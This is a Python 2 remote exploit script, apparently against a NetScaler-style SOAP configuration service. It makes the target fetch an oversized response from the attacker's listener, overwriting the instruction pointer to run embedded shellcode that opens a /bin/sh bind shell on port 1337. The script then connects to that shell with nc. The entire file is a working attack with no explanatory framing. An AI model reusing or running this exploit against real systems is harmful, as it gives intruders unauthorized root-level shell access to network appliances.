#!/usr/bin/python
import socket,sys,urllib2,multiprocessing,subprocess,time

if(len(sys.argv)<3):
	print 'usage: ' + sys.argv[0] +' remote_target ' + 'local_ip'
	print 'example: ' + sys.argv[0] +' 192.168.166.138 192.168.166.137'
	sys.exit()

soap_data = '<?xml version="1.0" encoding="ISO-8859-1"?><SOAP-ENV:Envelope SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns4277:login xmlns:ns4277="urn:NSConfig"><username xsi:type="xsd:string">a</username><password xsi:type="xsd:string">FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF</password><clientip xsi:type="xsd:string">QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ</clientip><cookieTimeout xsi:type="xsd:int">1800</cookieTimeout><ns xsi:type="xsd:string">' +sys.argv[2]+'</ns></ns4277:login></SOAP-ENV:Body></SOAP-ENV:Envelope>'

payload = ""
payload += "\x31\xc9\xf7\xe1\x51\x40\x50\x40\x50\x50\xb0\x61\xcd\x80\x96\x52\x66"
payload += "\x68\x05\x39\x66\x68\x01\x02\x89\xe1\x6a\x10\x51\x56\x50\xb0\x68\xcd"
payload += "\x80\x31\xc0\xb0\x05\x50\x56\x50\xb0\x6a\xcd\x80\x31\xc0\x50\x50\x56"
payload +="\x50\xb0\x1e\xcd\x80\x97\x31\xc0\x50\xb0\x02\xcd\x80\x09\xc0\x74\xea"
payload += "\x31\xc9\x31\xc0\x51\x57\x50\xb0\x5a\xcd\x80\xfe\xc1\x80\xf9\x03\x75"
payload += "\xf0\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89"
payload += "\xe1\x52\x51\x53\xb0\x3b\x50\xcd\x80"


resp = "\x00\x02\x00\x00\xa5\xa5"+("\x90"*54)+("\x00"*324)    #header bs
resp +='$$$$\x00\x00\x00\x00'+('\x00\x00\x00\x00'*30) #edx trickery to control crash landing driving value of eax to our desired location
resp += "\x00\x00\x00\x00" #0x29e6c51c <ns_cli_gethandler+20>: cmp    DWORD PTR [eax],ecx ; points at 0 to skip to ret
resp +="\x90"*24 #padding
resp += "\x00"*72
resp += "\x94\xda\xff\xff"  #EIP is here.
resp +="\xa8\xd9\xff\xff" #edx trickery to control crash landing to the previous location
resp += ("\x90" * 20) +payload + ("\x90" * 181)
resp += "\x00" * 140 #end comms

sent = False

def sploit_listen():
	HOST = None               # Symbolic name meaning all available interfaces
	PORT = 3010              # Arbitrary non-privileged port
	s = None
	for res in socket.getaddrinfo(HOST, PORT, socket.AF_UNSPEC,
				      socket.SOCK_STREAM, 0, socket.AI_PASSIVE):
	    af, socktype, proto, canonname, sa = res
	    try:
		s = socket.socket(af, socktype, proto)
	    except socket.error as msg:
		s = None
		continue
	    try:
		s.bind(sa)
		s.listen(1)
	    except socket.error as msg:
		s.close()
		s = None
		continue
	    break
	if s is None:
	    print 'could not open socket'
	    sys.exit(1)
	conn, addr = s.accept()
	print 'Connected by', addr
	print 'Sending Payload!'
	conn.send(resp)
	print 'Payload Sent!'
	conn.close()
	return

def trigger():
	urllib2.urlopen('http://'+sys.argv[1]+'/soap',soap_data)

print 'Starting Listener'
l_proc = multiprocessing.Process(target=sploit_listen)
l_proc.start()
time.sleep(2)
print 'Triggering Request'
t_proc = multiprocessing.Process(target=trigger)
t_proc.start()
time.sleep(2)
print 'Connecting'
subprocess.call('nc '+sys.argv[1]+' 1337 -v',shell=True)
